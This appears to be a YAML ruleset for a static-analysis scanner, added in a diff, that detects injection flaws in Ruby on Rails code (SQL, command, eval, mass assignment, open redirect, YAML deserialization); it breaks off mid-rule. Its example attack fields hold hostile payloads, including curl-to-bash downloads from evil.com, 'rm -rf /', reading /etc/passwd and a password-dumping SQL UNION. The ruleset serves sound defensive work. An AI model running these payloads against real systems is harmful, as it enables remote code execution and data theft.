@@ -1,0 +1,1436 @@
+rules:
+- rule_id: RUBY-INJ-001
+  title: SQL Injection via String Interpolation in ActiveRecord
+  description: 'Detects ActiveRecord queries using string interpolation with user-controlled input instead of parameterized
+    conditions.
+
+    '
+  language: ruby
+  category: injection
+  severity: Critical
+  confidence: 0.93
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - active-record
+  - rails
+  - sequel
+  - arel
+  patterns:
+  - type: regex
+    pattern: \.where\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  - type: regex
+    pattern: \.(?:find_by_sql|select|joins|order|group|having|from)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  - type: regex
+    pattern: \.execute\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  - type: regex
+    pattern: \.where\s*\(\s*['"][^'"]*["']\s*\+\s*(?:params|request|input|user)\b
+  - type: regex
+    pattern: \.(?:pluck|count|sum|average|minimum|maximum)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  - type: regex
+    pattern: ActiveRecord::Base\.connection\.(?:execute|select_all|select_one|select_value)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input)\b
+  - type: regex
+    pattern: \.(?:order|reorder|group)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  anti_patterns:
+  - .where(.*:.*)
+  - .where(.*?.*)
+  - sanitize_sql
+  - Arel
+  - '.where(name: params['
+  - quote(
+  - sanitize_sql_for_conditions
+  - sanitize_sql_array
+  - sanitize_sql_like
+  - ActiveRecord::Base.connection.quote
+  - bind(
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - class.*<.*ActiveRecord::Base
+    - class.*<.*ApplicationRecord
+    - Rails.application
+    - require.*active_record
+    - include ActiveModel
+    - def index
+    - def show
+    - def create
+    - def update
+    taint_source_indicators:
+    - params[
+    - params.permit
+    - request.params
+    - request.query_string
+    - request.body
+    - request.raw_post
+    - cookies[
+    - session[
+    - request.headers[
+    taint_sink_indicators:
+    - .where(
+    - .find_by_sql(
+    - .execute(
+    - .select(
+    - .joins(
+    - .order(
+    - .group(
+    - .having(
+    - .from(
+    - .pluck(
+    - connection.execute(
+    sanitization_patterns:
+    - sanitize_sql
+    - quote(
+    - Arel.sql
+    - bind(
+    - ActiveRecord::Base.connection.quote
+    - sanitize_sql_like
+    - 'where(key: value)'
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + data_sensitivity_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker sends a request to GET /users?name=admin'' OR ''1''=''1 to a Rails controller that uses User.where("name
+      = ''#{params[:name]}''"), bypassing authentication and dumping all user records.
+
+      '
+    example_payload: admin' UNION SELECT username, password FROM users--
+    attacker_objective: Exfiltrate database content, bypass authentication, modify or delete records, or escalate to OS command
+      execution via database functions.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'SQL injection via ActiveRecord string interpolation bypasses ORM protections.
+
+    Rails applications are especially susceptible when developers use raw SQL strings
+
+    with interpolation instead of parameterized conditions. Can lead to full database
+
+    compromise, data exfiltration, and in some database configurations, remote code
+
+    execution.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Rails ActiveRecord: use parameterized conditions\n      User.where(\"name =\
+    \ ?\", params[:name])\n      User.where(name: params[:name])\n  - Rails with Arel: use Arel predicates\n      users =\
+    \ User.arel_table\n      User.where(users[:name].eq(params[:name]))\n  - Sequel ORM: use dataset filtering\n      DB[:users].where(name:\
+    \ params[:name])\n  - Raw SQL: use sanitize_sql_array\n      User.where(sanitize_sql_array([\"name = ?\", params[:name]]))\n\
+    Secure libraries:\n  - ActiveRecord parameterized where clauses\n  - Arel query builder for complex queries\n  - Sequel\
+    \ ORM with built-in escaping\n  - Rails sanitize_sql_* helper methods\nPrevention strategies:\n  - Never use string interpolation\
+    \ in SQL fragments\n  - Use strong_parameters to whitelist allowed attributes\n  - Enable Brakeman static analysis in\
+    \ CI/CD pipeline\n  - Review raw SQL usage in code reviews\n  - Use database roles with minimal privileges\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://rails-sqli.org/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - RUBY-INJ-002
+    - RUBY-INJ-003
+    - TS-INJ-001
+    - KOTLIN-INJ-001
+  detection_layer: 1
+- rule_id: RUBY-INJ-002
+  title: Command Injection via Kernel System Methods
+  description: 'Detects use of system, exec, backticks, or %x with user-controlled input in Ruby applications.
+
+    '
+  language: ruby
+  category: injection
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - kernel-system
+  - rce
+  - backticks
+  - open3
+  patterns:
+  - type: regex
+    pattern: (?:system|exec|spawn)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  - type: regex
+    pattern: '`[^`]*#\{[^}]*(?:params|request|input|user)\b[^`]*`'
+  - type: regex
+    pattern: '%x\[[^\]]*#\{[^}]*(?:params|request|input|user)\b'
+  - type: regex
+    pattern: (?:IO|Open3)\.popen\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  - type: regex
+    pattern: Kernel\.(?:system|exec)\s*\(\s*(?:params|request|input|user)\b
+  - type: regex
+    pattern: '%x\([^)]*#\{[^}]*(?:params|request|input|user)\b'
+  - type: regex
+    pattern: Process\.spawn\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+  - type: regex
+    pattern: (?:system|exec|spawn)\s*\(\s*(?:params|request|input|user)\b
+  anti_patterns:
+  - Shellwords.escape
+  - shellescape
+  - Shellwords.shellescape
+  - system(*
+  - capture3(
+  - Open3.capture3
+  - '# nosec'
+  - allowlist
+  - whitelist
+  - ALLOWED_COMMANDS
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - require.*open3
+    - require.*shellwords
+    - class.*Job
+    - class.*Worker
+    - class.*Service
+    - def perform
+    taint_source_indicators:
+    - params[
+    - request.params
+    - ARGV
+    - gets
+    - readline
+    - ENV[
+    - cookies[
+    - request.body
+    - request.headers[
+    taint_sink_indicators:
+    - system(
+    - exec(
+    - spawn(
+    - backticks
+    - '%x['
+    - '%x('
+    - IO.popen(
+    - Open3.popen3(
+    - Process.spawn(
+    - Kernel.system(
+    - Kernel.exec(
+    - fork { exec
+    sanitization_patterns:
+    - Shellwords.escape
+    - shellescape
+    - Shellwords.shelljoin
+    - system(command, arg1, arg2)
+    - allowlist.include?
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + privilege_escalation_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Rails application has a controller action that converts files: system("convert #{params[:filename]}
+      output.png"). An attacker submits filename="; rm -rf / #" causing arbitrary command execution on the server.
+
+      '
+    example_payload: file.txt; curl http://evil.com/shell.sh | bash
+    attacker_objective: Execute arbitrary OS commands to gain remote code execution, exfiltrate data, install backdoors, or
+      pivot to internal networks.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Remote code execution through shell metacharacter injection. An attacker
+
+    can execute arbitrary operating system commands with the privileges of the
+
+    Ruby application process, potentially gaining full control of the server,
+
+    reading sensitive files, pivoting to internal networks, or installing
+
+    persistent backdoors.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Rails: avoid system() calls in controllers; use background jobs with validated\
+    \ arguments\n  - General: pass command and arguments as separate array elements\n      system(\"convert\", params[:filename],\
+    \ \"output.png\")\n  - Sidekiq/Resque: validate all job arguments before processing\nSecure libraries:\n  - Shellwords.escape()\
+    \ for argument escaping\n  - Open3.capture3 with array arguments for safe subprocess execution\n  - Terrapin/Cocaine gem\
+    \ for safe command line execution\n  - posix-spawn gem for safe process spawning\nPrevention strategies:\n  - Pass command\
+    \ and arguments as separate array elements to system()\n  - Use Open3.capture3(\"command\", \"arg1\", \"arg2\") with explicit\
+    \ arguments\n  - Validate input against strict allowlists of permitted values\n  - Never concatenate user input into command\
+    \ strings\n  - Run processes in sandboxed environments with minimal privileges\n  - Enable Brakeman command injection\
+    \ checks in CI/CD pipeline\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - RUBY-INJ-001
+    - RUBY-INJ-003
+    - CPP-INJ-001
+    - RUST-INJ-002
+  detection_layer: 1
+- rule_id: RUBY-INJ-003
+  title: Unsafe ERB/eval with User Input
+  description: 'Detects ERB template rendering or eval with user-controlled content, enabling arbitrary Ruby code execution.
+
+    '
+  language: ruby
+  category: injection
+  severity: Critical
+  confidence: 0.91
+  cwe: CWE-94
+  owasp: A03:2021-Injection
+  tags:
+  - code-injection
+  - erb
+  - eval
+  - rce
+  - metaprogramming
+  - send
+  patterns:
+  - type: regex
+    pattern: \beval\s*\(\s*(?:params|request|input|user|data)\b
+  - type: regex
+    pattern: ERB\.new\s*\(\s*(?:params|request|input|user|data)\b
+  - type: regex
+    pattern: instance_eval\s*\(\s*(?:params|request|input|user|data)\b
+  - type: regex
+    pattern: class_eval\s*\(\s*(?:params|request|input|user|data)\b
+  - type: regex
+    pattern: send\s*\(\s*(?:params|request|input|user)\b
+  - type: regex
+    pattern: module_eval\s*\(\s*(?:params|request|input|user|data)\b
+  - type: regex
+    pattern: binding\.eval\s*\(\s*(?:params|request|input|user|data)\b
+  - type: regex
+    pattern: (?:const_get|const_set)\s*\(\s*(?:params|request|input|user)\b
+  anti_patterns:
+  - '# nosec'
+  - sanitize
+  - ALLOWED_METHODS
+  - respond_to?
+  - method_defined?
+  - public_send
+  - whitelist
+  - allowlist
+  - SafeERB
+  - Erubi
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - class.*<.*ActiveRecord::Base
+    - require.*erb
+    - module.*Helper
+    - class.*Mailer
+    - class.*Service
+    - before_action
+    taint_source_indicators:
+    - params[
+    - request.body
+    - request.params
+    - cookies[
+    - session[
+    - request.raw_post
+    - gets
+    - ARGV
+    - request.headers[
+    taint_sink_indicators:
+    - eval(
+    - instance_eval(
+    - class_eval(
+    - module_eval(
+    - binding.eval(
+    - ERB.new(
+    - send(
+    - public_send(
+    - const_get(
+    - __send__(
+    - method(
+    sanitization_patterns:
+    - ALLOWED_METHODS.include?
+    - respond_to?
+    - method_defined?
+    - public_method_defined?
+    - allowlist
+    - whitelist.include?
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + direct_rce_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Rails application has an admin panel that evaluates user-provided Ruby expressions for a reporting
+      feature: eval(params[:expression]). An attacker submits expression=`cat /etc/passwd` to read system files, or system(''curl
+      evil.com/backdoor.sh|bash'') to install a backdoor.
+
+      '
+    example_payload: system('curl http://evil.com/shell.sh | bash')
+    attacker_objective: Achieve arbitrary Ruby code execution to fully compromise the server, steal credentials, pivot to
+      internal systems, or establish persistent access.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Arbitrary Ruby code execution via eval or dynamic template rendering.
+
+    This is the most severe class of vulnerability: attackers can execute any
+
+    Ruby code, read/write files, access databases, make network requests,
+
+    and completely compromise the application and underlying server.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Rails: use pre-compiled ERB templates from the views directory; never render\
+    \ user-provided templates\n  - Sinatra: use layout/template system instead of dynamic ERB construction\n  - Background\
+    \ jobs: validate method names against explicit allowlists before send()\nSecure libraries:\n  - Erubi gem (safe ERB engine\
+    \ with auto-escaping)\n  - Liquid templating engine for user-provided templates (sandboxed)\n  - Mustache for logic-less\
+    \ user-controlled templates\nPrevention strategies:\n  - Never use eval() with user input under any circumstances\n  -\
+    \ Use pre-compiled ERB templates loaded from files, not user data\n  - Replace send() with explicit method calls or strict\
+    \ allowlists\n  - Use a strict allowlist for permitted methods when dynamic dispatch is required\n  - Use public_send\
+    \ instead of send and validate method names against respond_to?(:method, false)\n  - Apply the principle of least privilege:\
+    \ run application with minimal OS permissions\n  - Use Ruby's $SAFE level or Sandboxing for untrusted code (note: $SAFE\
+    \ is deprecated in Ruby 3.x)\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/94.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - RUBY-INJ-001
+    - RUBY-INJ-002
+    - TS-INJ-002
+  detection_layer: 1
+- rule_id: RUBY-INJ-004
+  title: Mass Assignment / Strong Parameters Bypass
+  description: 'Detects ActiveRecord models and controller actions that permit unprotected attribute assignment from user-controlled
+    input, allowing attackers to set privileged fields such as admin flags, role columns, account balances, or foreign keys
+    by injecting unexpected parameters into create or update calls.
+
+    '
+  language: ruby
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-915
+  owasp: A04:2021-Insecure Design
+  tags:
+  - mass-assignment
+  - strong-parameters
+  - attr-accessible
+  - rails
+  - active-record
+  - privilege-escalation
+  detection_layer: 2
+  attack_surface_type: HTTP parameter binding
+  patterns:
+  - type: regex
+    pattern: \.(?:create|new|update|update_attributes|assign_attributes)\s*\(\s*params\b
+    description: Direct use of raw params hash in model create/update without permit filtering
+  - type: regex
+    pattern: \.(?:create|new|update)\s*\(\s*request\.params\b
+    description: Direct use of request.params in model persistence methods
+  - type: regex
+    pattern: params\.permit!\s*
+    description: Blanket permit-all call that bypasses strong parameter protections entirely
+  - type: regex
+    pattern: params\.permit\s*\(\s*!\s*\)
+    description: Alternative permit! invocation pattern that whitelists every parameter
+  - type: regex
+    pattern: attr_accessible\s*$
+    description: Empty attr_accessible declaration in legacy Rails that leaves all attributes writable
+  - type: regex
+    pattern: config\.action_controller\.permit_all_parameters\s*=\s*true
+    description: Global application config that disables strong parameters protection across all controllers
+  - type: regex
+    pattern: \.update_attribute\s*\(\s*(?:params|request|input|user)\b
+    description: update_attribute (singular) skips validations and mass-assignment protections
+  - type: regex
+    pattern: \.(?:create|update|new)\s*\(\s*params\.to_unsafe_h
+    description: Explicit conversion of params to an unsafe hash bypassing strong parameters
+  anti_patterns:
+  - params.require(
+  - .permit(
+  - strong_parameters
+  - attr_accessible :name
+  - attr_protected
+  - StrongParameters
+  - ActionController::Parameters
+  - permitted?
+  - slice(
+  - only(
+  bypass_variants:
+  - description: Using JSON.parse on request body to circumvent strong parameters
+    pattern: JSON\.parse\s*\(\s*request\.(?:body|raw_post)\b.*\.(?:create|update)
+  - description: Merging user input with a base hash to sneak in extra attributes
+    pattern: \.merge\s*\(\s*params\b.*\.(?:create|update|save)
+  - description: Using Hash#symbolize_keys or to_h on params to evade permit checks
+    pattern: params\.(?:to_h|to_hash|symbolize_keys)\b
+  evasion_indicators:
+  - params.to_unsafe_hash
+  - params.to_h
+  - ActionController::Parameters.new(request.body)
+  - JSON.parse(request.raw_post)
+  encoding_variants:
+  - type: nested_parameter_injection
+    pattern: params\[.*\]\[.*(?:admin|role|is_admin|privilege|permission)\b
+  - type: array_wrapping
+    pattern: params\.permit\(.*\[\]\s*\)
+  multi_function_chain_patterns:
+  - \.new\s*\(\s*params\b.*\.save
+  - params\.merge\(.*\).*\.(?:create|update|save)
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: true
+    escalation_vector: Horizontal and vertical privilege escalation by setting role, admin, or permission attributes via unprotected
+      mass assignment
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: params[:user] or request.params
+    sink: User.create() / User.update()
+    through: Controller action without params.require().permit() filtering
+  - source: JSON.parse(request.body.read)
+    sink: Model.new(parsed_data).save
+    through: Manual JSON deserialization bypassing strong parameters
+  impact: 'Mass assignment allows attackers to modify any model attribute by injecting
+
+    unexpected parameters in HTTP requests. This can lead to vertical privilege
+
+    escalation (setting admin=true), horizontal privilege escalation (changing
+
+    user_id foreign keys), financial manipulation (modifying balance or price
+
+    columns), data corruption (overwriting audit timestamps), and bypassing
+
+    business logic constraints. In Rails applications prior to version 4.0,
+
+    all attributes were mass-assignable by default, and even in modern Rails,
+
+    misuse of params.permit! or to_unsafe_hash reintroduces the vulnerability.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Rails 4+: always use strong parameters with explicit permit lists\n      def\
+    \ user_params\n        params.require(:user).permit(:name, :email, :password)\n      end\n      User.create(user_params)\n\
+    \  - Rails 3.x: use attr_accessible in models with explicit attribute lists\n      class User < ActiveRecord::Base\n \
+    \       attr_accessible :name, :email, :password\n      end\n  - API controllers: parse and validate JSON bodies through\
+    \ strong parameters\n      def api_params\n        ActionController::Parameters.new(JSON.parse(request.body.read))\n \
+    \         .require(:user).permit(:name, :email)\n      end\nSecure libraries:\n  - ActionController::StrongParameters\
+    \ (built into Rails 4+)\n  - Pundit or CanCanCan for attribute-level authorization\n  - dry-validation for schema-level\
+    \ input validation\n  - ActiveModel::Serializers for controlling attribute exposure\nPrevention strategies:\n  - Never\
+    \ pass raw params directly to create, update, or new\n  - Never use params.permit! in production code\n  - Define separate\
+    \ permit lists for different user roles (admin vs regular user)\n  - Use Brakeman mass_assignment check in CI/CD pipeline\n\
+    \  - Audit models for sensitive columns (role, admin, balance, permissions)\n  - Add integration tests that verify unpermitted\
+    \ attributes are rejected\n  - Consider using Form Objects or Service Objects to decouple input handling\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/915.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
+  - https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - class.*<.*ActionController::Base
+    - class.*<.*ActionController::API
+    - class.*<.*ApplicationRecord
+    - class.*<.*ActiveRecord::Base
+    - def create
+    - def update
+    - before_action
+    taint_source_indicators:
+    - params[
+    - params.require
+    - request.params
+    - request.body
+    - request.raw_post
+    - JSON.parse(request
+    - params.to_unsafe_hash
+    - params.permit!
+    taint_sink_indicators:
+    - .create(
+    - .new(
+    - .update(
+    - .update_attributes(
+    - .assign_attributes(
+    - .update_attribute(
+    - .build(
+    - .create!(
+    - .update!(
+    - .save
+    sanitization_patterns:
+    - params.require(
+    - .permit(
+    - attr_accessible
+    - attr_protected
+    - permitted?
+    - slice(
+    - only(
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 + privilege_escalation_factor + data_sensitivity_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Rails application has a registration endpoint that calls User.create(params[:user]) without strong
+      parameter filtering. An attacker sends a POST request with user[admin]=true or user[role]=superadmin in the request
+      body, setting privileged attributes on their newly created account and gaining administrative access to the entire application.
+
+      '
+    example_payload: 'POST /users { user: { name: ''attacker'', email: ''a@evil.com'', admin: true, role: ''superadmin'' }
+      }'
+    attacker_objective: Escalate privileges to administrator level, modify financial attributes like account balance, or change
+      ownership of records by overwriting foreign key columns.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RUBY-INJ-001
+    - RUBY-INJ-005
+    - RUBY-INJ-003
+- rule_id: RUBY-INJ-005
+  title: Open Redirect via redirect_to with User-Controlled URL
+  description: 'Detects instances where Rails redirect_to is called with a URL derived from user-controlled input such as
+    params, request headers, or cookie values, enabling attackers to redirect authenticated users to malicious phishing sites
+    that harvest credentials or serve malware while appearing to originate from a trusted domain.
+
+    '
+  language: ruby
+  category: injection
+  severity: Medium
+  confidence: 0.85
+  cwe: CWE-601
+  owasp: A01:2021-Broken Access Control
+  tags:
+  - open-redirect
+  - phishing
+  - redirect-to
+  - rails
+  - url-validation
+  - oauth-bypass
+  detection_layer: 2
+  attack_surface_type: HTTP response manipulation
+  patterns:
+  - type: regex
+    pattern: redirect_to\s*\(?\s*params\[.*\]
+    description: Direct redirect_to using a parameter value as the target URL
+  - type: regex
+    pattern: redirect_to\s*\(?\s*(?:request\.referer|request\.referrer)\b
+    description: Redirect based on the Referer header which is fully attacker-controlled
+  - type: regex
+    pattern: redirect_to\s*\(?\s*(?:URI|URI\.parse)\s*\(\s*params\b
+    description: Redirect using URI.parse on user input which does not validate the host
+  - type: regex
+    pattern: redirect_to\s*\(?\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
+    description: Redirect URL constructed via string interpolation with user input
+  - type: regex
+    pattern: redirect_to\s*\(?\s*(?:session|cookies)\[.*(?:return_to|redirect|url|next|callback)\b
+    description: Redirect to a URL stored in session or cookies by a previous user-controlled request
+  - type: regex
+    pattern: redirect_to\s*\(?\s*(?:params|request)\.(?:url|path|query_string|original_url)\b
+    description: Redirect using request URL properties that reflect attacker-controlled values
+  - type: regex
+    pattern: redirect_to\s+(?:params|request|input|user)\b
+    description: Redirect using raw params or request object without parentheses
+  - type: regex
+    pattern: redirect_to\s*\(?\s*(?:[a-z_]+_url|[a-z_]+_path)\s*\(\s*(?:host|subdomain)\s*:\s*params\b
+    description: Named route helper with user-controlled host or subdomain parameter
+  anti_patterns:
+  - redirect_to root_path
+  - redirect_to root_url
+  - 'redirect_to action:'
+  - 'redirect_to controller:'
+  - redirect_to_back
+  - allowed_hosts
+  - valid_redirect?
+  - safe_redirect
+  - URI.parse(url).host == request.host
+  - 'only_path: true'
+  bypass_variants:
+  - description: Using protocol-relative URLs (//evil.com) to bypass naive http/https checks
+    pattern: redirect_to\s*\(?\s*['"]//[^'"]*(?:params|request|input)\b
+  - description: URL encoding or double encoding the target to bypass path-based filters
+    pattern: redirect_to\s*\(?\s*(?:CGI|URI|ERB::Util)\.(?:unescape|decode)\s*\(\s*params\b
+  - description: Using backslash or tab characters in URLs to bypass host validation
+    pattern: redirect_to\s*\(?\s*params\[.*\]\.gsub\b
+  evasion_indicators:
+  - //evil.com
+  - https://trusted.com@evil.com
+  - /%09/evil.com
+  - data:text/html
+  - 'javascript:'
+  encoding_variants:
+  - type: url_encoding
+    pattern: redirect_to\s*\(?\s*(?:CGI|URI)\.unescape\s*\(\s*params\b
+  - type: base64_encoding
+    pattern: redirect_to\s*\(?\s*Base64\.decode64\s*\(\s*params\b
+  multi_function_chain_patterns:
+  - params\[.*(?:url|redirect|return|next|callback)\b.*redirect_to
+  - session\[.*(?:return_to|redirect_url)\b.*=.*params\b.*redirect_to.*session\[
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: false
+    escalation_vector: Credential harvesting via phishing redirect after OAuth/login flow, leading to account takeover
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: params[:return_to] or params[:redirect_url]
+    sink: redirect_to(target_url)
+    through: Controller action handling post-login or post-action redirect
+  - source: request.referer
+    sink: redirect_to(request.referer)
+    through: Fallback redirect using Referer header trusted without host validation
+  impact: 'Open redirects enable attackers to construct URLs on a trusted domain that
+
+    redirect victims to attacker-controlled sites. This is particularly dangerous
+
+    in authentication flows (OAuth callbacks, post-login redirects, SSO return URLs)
+
+    where users expect to remain on the trusted site. Attackers can harvest
+
+    credentials via convincing phishing pages, steal OAuth authorization codes,
+
+    distribute malware under the appearance of a trusted domain, and bypass URL-based
+
+    security controls such as CSP or domain allowlists. While classified as medium
+
+    severity in isolation, open redirects frequently serve as a critical component
+
+    in chained attacks.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Rails: use only_path option to force relative redirects\n      redirect_to\
+    \ params[:return_to], only_path: true\n  - Rails: validate the host of the redirect URL against an allowlist\n      uri\
+    \ = URI.parse(params[:return_to])\n      if ALLOWED_HOSTS.include?(uri.host)\n        redirect_to params[:return_to]\n\
+    \      else\n        redirect_to root_path\n      end\n  - Rails: use named route helpers instead of dynamic URLs\n  \
+    \    redirect_to dashboard_path\n  - Devise/OmniAuth: configure allowed redirect origins in initializer\n      config.navigational_formats\
+    \ = []\nSecure libraries:\n  - Rails url_for with only_path: true\n  - Devise Omniauthable with strict callback validation\n\
+    \  - rack-protection gem for redirect safety\n  - addressable gem for robust URL parsing and host validation\nPrevention\
+    \ strategies:\n  - Never pass user input directly to redirect_to without validation\n  - Maintain a server-side allowlist\
+    \ of permitted redirect hosts\n  - Use relative paths (only_path: true) for all post-action redirects\n  - Store return\
+    \ URLs in server-side session under a validated key\n  - Strip or reject URLs containing @, backslashes, or protocol-relative\
+    \ prefixes\n  - Validate redirect targets in integration tests with malicious URL payloads\n  - Log all external redirects\
+    \ for security monitoring\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/601.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
+  - https://brakemanscanner.org/docs/warning_types/redirect/
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - class.*<.*ActionController::Base
+    - def create
+    - def callback
+    - def authenticate
+    - before_action.*authenticate
+    - after_sign_in_path_for
+    - after_sign_out_path_for
+    - devise
+    taint_source_indicators:
+    - params[:return_to]
+    - params[:redirect_url]
+    - params[:next]
+    - params[:callback]
+    - params[:url]
+    - params[:target]
+    - request.referer
+    - request.referrer
+    - session[:return_to]
+    - cookies[:redirect]
+    taint_sink_indicators:
+    - redirect_to(
+    - 'redirect_to '
+    - redirect_back(
+    - 'head :moved_permanently, location:'
+    - response.headers['Location']
+    sanitization_patterns:
+    - 'only_path: true'
+    - URI.parse(url).host
+    - allowed_hosts.include?
+    - valid_redirect?
+    - safe_redirect
+    - url_for(
+    - ALLOWED_REDIRECT_HOSTS
+  severity_scoring:
+    severity_weight: 6
+    risk_score_formula_hint: severity_weight * confidence * (1 + authentication_flow_proximity + chaining_factor)
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'A Rails application redirects users after login using redirect_to(params[:return_to]). An attacker crafts
+      a login link: https://trusted-app.com/login?return_to=https://evil-app.com/phish and sends it to a victim. After the
+      victim successfully authenticates on the legitimate site, they are seamlessly redirected to the attacker''s phishing
+      page which mimics the application and requests re-entry of credentials or MFA tokens.
+
+      '
+    example_payload: https://trusted-app.com/auth/callback?return_to=https://evil.com/steal-token
+    attacker_objective: Redirect authenticated users to phishing sites to harvest credentials, steal OAuth tokens or session
+      cookies, or serve malware under the guise of a trusted domain.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - RUBY-INJ-004
+    - RUBY-INJ-001
+    - TS-INJ-003
+- rule_id: RUBY-INJ-006
+  title: YAML Deserialization via Psych.load / YAML.load
+  description: 'Detects use of YAML.load or Psych.load with user-controlled input, which enables arbitrary object instantiation
+    and remote code execution through crafted YAML payloads that exploit Ruby''s object deserialization mechanism. YAML.load
+    in Ruby deserializes arbitrary Ruby objects including those with dangerous side effects in their initialize or === methods.
+
+    '
+  language: ruby
+  category: injection
+  severity: High
+  confidence: 0.92
+  cwe: CWE-502
+  owasp: A08:2021-Software and Data Integrity Failures
+  tags:
+  - deserialization
+  - yaml
+  - psych
+  - rce
+  - object-injection
+  - unsafe-load
+  detection_layer: 3
+  attack_surface_type: Data deserialization endpoint
+  patterns:
+  - type: regex
+    pattern: YAML\.load\s*\(\s*(?:params|request|input|user|data|body)\b
+    description: Direct YAML.load call with user-controlled input enabling arbitrary object deserialization
+  - type: regex
+    pattern: Psych\.load\s*\(\s*(?:params|request|input|user|data|body)\b
+    description: Psych.load (underlying YAML engine) with user data, equivalent risk to YAML.load
+  - type: regex
+    pattern: YAML\.load\s*\(\s*(?:File\.read|IO\.read|open)\s*\(\s*(?:params|request|input|user)\b
+    description: YAML.load reading from a user-controlled file path, combining path traversal with deserialization
+  - type: regex
+    pattern: YAML\.load\s*\(\s*(?:request\.body|request\.raw_post)\b
+    description: YAML.load directly parsing the raw HTTP request body
+  - type: regex
+    pattern: YAML\.load\s*\(\s*(?:Base64\.decode64|CGI\.unescape|URI\.decode)\s*\(\s*(?:params|request)\b
+    description: YAML.load with encoded user input, indicating potential evasion of input filters
+  - type: regex
+    pattern: Psych\.unsafe_load\s*\(\s*(?:params|request|input|user|data)\b
+    description: Psych.unsafe_load explicitly opts into dangerous deserialization with user data
+  - type: regex
